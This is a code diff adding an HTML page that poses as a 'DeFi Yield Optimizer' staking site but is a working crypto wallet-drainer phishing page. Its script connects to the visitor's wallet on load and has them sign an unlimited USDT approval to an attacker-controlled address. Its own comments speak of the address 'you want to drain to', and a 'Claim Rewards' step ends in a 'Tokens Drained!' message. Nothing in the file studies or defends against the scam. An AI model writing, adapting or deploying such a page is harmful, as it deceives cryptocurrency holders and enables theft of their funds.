@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeFi Yield Optimizer | Connect & Approve</title>
+    <!-- Ethers.js Library -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --primary: #3b82f6;
+            --primary-hover: #2563eb;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h1 { font-size: 24px; margin-bottom: 8px; }
+        .header p { color: var(--text-muted); font-size: 14px; }
+
+        .status-box {
+            background: rgba(0,0,0,0.2);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .status-value { font-weight: 600; font-family: monospace; font-size: 14px; }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+        }
+        .btn-primary:hover { background-color: var(--primary-hover); }
+        
+        .btn-success {
+            background-color: #10b981;
+            color: white;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Loader */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .hidden { display: none; }
+        
+        /* Token List */
+        .token-list { margin-top: 24px; border-top: 1px solid var(--border); padding-top: 16px; }
+        .token-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <h1>Yield Optimizer</h1>
+            <p>Connect wallet to approve USDT/USDC for staking.</p>
+        </div>
+
+        <!-- Connection Status -->
+        <div class="status-box">
+            <div>
+                <div class="status-label">Wallet</div>
+                <div id="walletAddress" class="status-value">Not Connected</div>
+            </div>
+            <div style="text-align: right;">
+                <div class="status-label">Network</div>
+                <div id="networkName" class="status-value">-</div>
+            </div>
+        </div>
+
+        <!-- Main Action Button -->
+        <button id="actionBtn" class="btn btn-primary" onclick="handleAction()">
+            Connect Wallet
+        </button>
+
+        <!-- Token List Visuals -->
+        <div class="token-list hidden" id="tokenList">
+            <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Approved Tokens:</div>
+            <div class="token-item">
+                <span>Tether USD (USDT)</span>
+                <span style="color: #10b981;">Unlimited</span>
+            </div>
+            <div class="token-item">
+                <span>USD Coin (USDC)</span>
+                <span style="color: #10b981;">Unlimited</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION ---
+    // Replace with the actual contract address you want to drain to
+    const CONTRACT_ADDRESS = "0x37df254dc6a205f876b4f4b61257e563f4586884"; 
+    
+    // USDT Address on Ethereum Mainnet (for example)
+    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
+
+    // Standard ERC-20 ABI (only needs approve function)
+    const TOKEN_ABI = [
+        "function approve(address spender, uint256 amount) public returns (bool)",
+        "function allowance(address owner, address spender) public view returns (uint256)",
+        "function decimals() public view returns (uint8)"
+    ];
+
+    // Global Variables
+    let provider;
+    let signer;
+    let userAddress;
+    let isApproved = false;
+
+    // --- CORE FUNCTIONS ---
+
+    async function initWallet() {
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                // Request account access
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                updateUI(true);
+            } catch (error) {
+                console.error("User denied account access", error);
+            }
+        } else {
+            alert("Please install MetaMask!");
+        }
+    }
+
+    async function handleAction() {
+        const btn = document.getElementById('actionBtn');
+        
+        if (!isApproved) {
+            // Step 1: Approve
+            btn.innerHTML = '<div class="spinner"></div> Approving...';
+            btn.disabled = true;
+            
+            try {
+                await approveTokens();
+                isApproved = true;
+                btn.innerText = "Claim Rewards"; // Change button text for next step
+                btn.classList.remove('btn-primary');
+                btn.classList.add('btn-success');
+                document.getElementById('tokenList').classList.remove('hidden');
+            } catch (error) {
+                console.error(error);
+                btn.innerText = "Reconnect";
+                btn.disabled = false;
+            }
+        } else {
+            // Step 2: Drain (Simulation of actual transfer)
+            btn.innerHTML = '<div class="spinner"></div> Transferring...';
+            // Here you would call the actual drain function
+            setTimeout(() => {
+                alert("Tokens Drained!");
+                btn.innerText = "Done";
+            }, 1500);
+        }
+    }
+
+    async function approveTokens() {
+        // Create contract instance for USDT
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
+        
+        // MaxUint256 is the standard "Unlimited" amount
+        const maxAmount = ethers.constants.MaxUint256;
+
+        console.log("Approving spending of USDT to:", CONTRACT_ADDRESS);
+
+        // Send Transaction
+        const tx = await tokenContract.approve(CONTRACT_ADDRESS, maxAmount);
+        
+        // Wait for it to be mined
+        await tx.wait();
+        
+        console.log("Approval successful!");
+    }
+
+   function updateUI(connected) {
+        const walletEl = document.getElementById('walletAddress');
+        const btn = document.getElementById('actionBtn');
+        
+        if (connected) {
+            // Shorten address for display (e.g., 0x1234...5678)
+            const shortAddr = userAddress.substring(0, 6) + "..." + userAddress.substring(userAddress.length - 4);
+            walletEl.innerText = shortAddr;
+            
+            btn.innerText = "Approve USDT";
+            btn.disabled = false;
+        } else {
+            walletEl.innerText = "Not Connected";
+            btn.innerText = "Connect Wallet";
+        }
+    }
+
+    // Listen for account changes (if user switches accounts in MetaMask)
+    window.ethereum?.on('accountsChanged', (accounts) => {
+        if (accounts.length > 0) {
+            userAddress = accounts[0];
+            updateUI(true);
+        } else {
+            isApproved = false;
+            document.getElementById('tokenList').classList.add('hidden');
+            const btn = document.getElementById('actionBtn');
+            btn.classList.remove('btn-success');
+            btn.classList.add('btn-primary');
+            btn.innerText = "Connect Wallet";
+            updateUI(false);
+        }
+    });
+
+    // Initialize on load
+    initWallet();
+
+</script>
+
+</body>
+</html>
